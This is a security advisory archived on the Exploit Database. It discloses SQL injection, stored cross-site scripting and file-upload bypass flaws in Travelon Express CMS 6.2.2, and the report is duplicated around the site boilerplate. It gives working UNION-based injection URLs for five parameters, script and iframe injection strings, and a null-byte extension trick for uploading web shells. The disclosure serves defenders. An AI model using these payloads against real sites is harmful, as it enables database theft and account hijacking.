Abstract:
=========
The Vulnerability Laboratory Research Team discovered multiple Web Vulnerabilities in Travelon Express CMS v6.2.2.

Report-Timeline:
================
2012-05-10:  Public or Non-Public Disclosure

Status:
========
Published

Exploitation-Technique:
=======================
Remote

Severity:
=========
Critical

Details:
========
1.1
Multiple remote SQL Injection vulnerabilities are detected in Travelon Express CMS v6.2.2. The vulnerability
allows an attacker (remote) or local low privileged user account to inject/execute own sql commands on the
affected application dbms. Successful exploitation of the vulnerability results in dbms & application compromise.
The vulnerabilities are located on the application values, parameter & requests of hid, cid, id & fid.

Vulnerable Module(s):
          [+] holiday.php?hid
          [+] pages.php?id
          [+] holiday_book.php?hid
          [+] admin/airline-edit.php?fid
          [+] admin/customer-edit.php?cid

1.2
Multiple persistent input validation vulnerabilities are detected in Travelon Express Version 6.2.2. The bugs
allow remote attackers to implement/inject malicious script code on the application side (persistent). Successful
exploitation of the vulnerability can lead to session hijacking (manager/admin) or stable (persistent) context
manipulation. Exploitation requires low user inter action & privileged user account.

Vulnerable Module(s):
          [+] holiday_add.php - holiday name
          [+] holiday_view.php- holiday name

1.3
An arbitrary file upload vulnerability is detected in Travelon Express Version 6.2.2. The vulnerability allows an
the privileged attacker(admin rights) to upload malicious files (webshells). The attacker can upload .php .exe .asp
files to the web server. Successful exploitation of the vulnerability can lead to web shell or malicious program
uploads. Exploitation requires privileged user account. An attacker can upload 2 filename extensions with %00 and
delete the last part to execute the file code.

Vulnerable Module(s):
          [+] airline-edit.php?fid
          [+] hotel-image-add.php
          [+] hotel-add.php

Proof of Concept:
=================
1.1
The sql injection vulnerabilities can be exploited by remote attacker without required user inter action.
2 of the vulnerabilities are located on the control panel. To exploit both its required to have privileged
application accounts like moderator, super mod or administrator. For demonstration or reproduce ...

PoC:
/holiday.php?hid=2[-2+union+select+1,2,3,group_concat(table_name),5,6,7,8+from+information_schema.tables+where+table_schema=database()--%20-]
/pages.php?id=1[-2+union+select+1,2,3,group_concat(table_name),5,6,7,8+from+information_schema.tables+where+table_schema=database()--%20-]
/holiday_book.php?hid=1[-2+union+select+1,2,3,group_concat(table_name),5,6,7,8+from+information_schema.tables+where+table_schema=database()--%20-]

/admin/airline-edit.php?fid=1[-2+union+select+1,2,3,group_concat(table_name),5,6,7,8+from+information_schema.tables+where+table_schema=database()--%20-]
/admin/customer-edit.php?cid=1[-2+union+select+1,2,3,group_concat(table_name),5,6,7,8+from+information_schema.tables+where+table_schema=database()--%20-]

1.2
The persistent input validation vulnerabilities can be exploited by remote attackers with low required
user inter action & privileged user account. For demonstration or reproduce ...

PoC:
admin/holiday_add.php - holiday name
admin/holiday_view.php- holiday name

holiday name => Insert the following test strings & save the input ...

>“<ScriPt>ALeRt("VlAb")</scriPt>
>"<IfRaMe sRc=hTtp://vulnerability-lab.com></IfRaMe>

... now switch to the listing & output page of the holidayname were it is getting executed out of the context.

1.3
The file upload bypass vulnerability can be exploited by remote attackers with privileged user account.
For demonstration or reproduce ...

PoC:
admin/airline-edit.php?fid
admin/hotel-image-add.php
admin/hotel-add.php

Reference(s):
http://travelon.xxx.com/upload/holiday/hi9223test.php

Risk:
=====
1.1
The security risk of the sql injection vulnerabilities are estimated as critical.

1.2
The security risk of the persistent input validation vulnerabilities are estimated as medium.

1.3
The security risk of the arbitrary file upload vulnerability is estimated as medium(-).

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

Severity Level:
===============
High
Technical Details & Description:
================================
1.1
Multiple remote SQL Injection vulnerabilities are detected in Travelon Express CMS v6.2.2. The vulnerability
allows an attacker (remote) or local low privileged user account to inject/execute own sql commands on the
affected application dbms. Successful exploitation of the vulnerability results in dbms & application compromise.
The vulnerabilities are located on the application values, parameter & requests of hid, cid, id & fid.
Vulnerable Module(s):
[+] holiday.php?hid
[+] pages.php?id
[+] holiday\_book.php?hid
[+] admin/airline-edit.php?fid
[+] admin/customer-edit.php?cid
1.2
Multiple persistent input validation vulnerabilities are detected in Travelon Express Version 6.2.2. The bugs
allow remote attackers to implement/inject malicious script code on the application-side (persistent). Successful
exploitation of the vulnerability can lead to session hijacking (manager/admin) or stable (persistent) context
manipulation. Exploitation requires low user inter action & privileged user account.
Vulnerable Module(s):
[+] holiday\_add.php - holiday name
[+] holiday\_view.php- holiday name
1.3
An arbitrary file upload vulnerability is detected in Travelon Express Version 6.2.2. The vulnerability allows an
the privileged attacker(admin rights) to upload malicious files (webshells). The attacker can upload .php .exe .asp
files to the web server. Successful exploitation of the vulnerability can lead to web shell or malicious program
uploads. Exploitation requires privileged user account. An attacker can upload 2 filename extensions with %00 and
delete the last part to execute the file code.
Vulnerable Module(s):
[+] airline-edit.php?fid
[+] hotel-image-add.php
[+] hotel-add.php
Proof of Concept (PoC):
=======================
1.1
The sql injection vulnerabilities can be exploited by remote attacker without required user inter action.
2 of the vulnerabilities are located on the control panel. To exploit both its required to have privileged
application accounts like moderator, super mod or administrator. For demonstration or reproduce ...
PoC:
/holiday.php?hid=2[-2+union+select+1,2,3,group\_concat(table\_name),5,6,7,8+from+information\_schema.tables+where+table\_schema=database()--%20-]
/pages.php?id=1[-2+union+select+1,2,3,group\_concat(table\_name),5,6,7,8+from+information\_schema.tables+where+table\_schema=database()--%20-]
/holiday\_book.php?hid=1[-2+union+select+1,2,3,group\_concat(table\_name),5,6,7,8+from+information\_schema.tables+where+table\_schema=database()--%20-]
/admin/airline-edit.php?fid=1[-2+union+select+1,2,3,group\_concat(table\_name),5,6,7,8+from+information\_schema.tables+where+table\_schema=database()--%20-]
/admin/customer-edit.php?cid=1[-2+union+select+1,2,3,group\_concat(table\_name),5,6,7,8+from+information\_schema.tables+where+table\_schema=database()--%20-]
1.2
The persistent input validation vulnerabilities can be exploited by remote attackers with low required
user inter action & privileged user account. For demonstration or reproduce ...
PoC:
admin/holiday\_add.php - holiday name
admin/holiday\_view.php- holiday name
holiday name => Insert the following test strings & save the input ...
>“
>"
... now switch to the listing & output page of the holidayname were it is getting executed out of the context.
1.3
The file upload bypass vulnerability can be exploited by remote attackers with privileged user account.
For demonstration or reproduce ...
PoC:
admin/airline-edit.php?fid
admin/hotel-image-add.php
admin/hotel-add.php
